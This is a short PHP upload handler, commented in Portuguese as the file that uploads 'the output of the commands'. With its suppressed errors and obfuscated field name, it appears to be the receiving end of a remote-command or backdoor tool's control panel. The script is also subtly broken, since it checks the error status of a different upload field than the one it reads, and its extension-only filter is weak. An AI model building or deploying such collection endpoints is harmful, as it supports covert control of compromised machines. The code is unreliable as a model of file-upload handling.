<?php
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 
// 034558735432.cpp / Uploader.php ~~
//   Arquivo responsável por fazer upload da saida dos comandos...
//
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	error_reporting(0);
	
	if (isset($_FILES['A3948982388842734']['name'])) {
		if ((!empty($_FILES["A3948982388842734"])) && ($_FILES['uploaded_file']['error'] == 0)) {
			
			$filename = basename($_FILES['A3948982388842734']['name']);
			$ext = substr($filename, strrpos($filename, '.') + 1);
			if ($ext != "php") {
			
				$uploadfile = "LGX/TEMP.txt";
				
				$FileX = fopen($uploadfile, "r");
				if ($FileX) {
					fclose($FileX); unlink($uploadfile);
					move_uploaded_file($_FILES['A3948982388842734']['tmp_name'], $uploadfile); 
					
				} else {
					move_uploaded_file($_FILES['A3948982388842734']['tmp_name'], $uploadfile); 
				}
			}
		}
	}

// EOF  ~~ 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
?>
